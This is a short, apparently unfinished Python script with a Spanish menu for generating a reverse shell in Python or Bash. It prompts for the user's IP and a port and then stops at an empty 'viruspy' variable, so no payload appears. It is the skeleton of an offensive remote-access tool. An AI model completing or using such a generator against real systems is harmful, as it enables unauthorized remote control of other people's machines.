import os
numero = int(input("""

Escoja la opcion que desea 

1: reverse shell en Python {.py}
2: reverse shell en Bash {.sh}

>  """))

if numero == 1: 
   ip = input("""
   Introduzca su ip
   
   >  """)
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)
   viruspy = ""
   
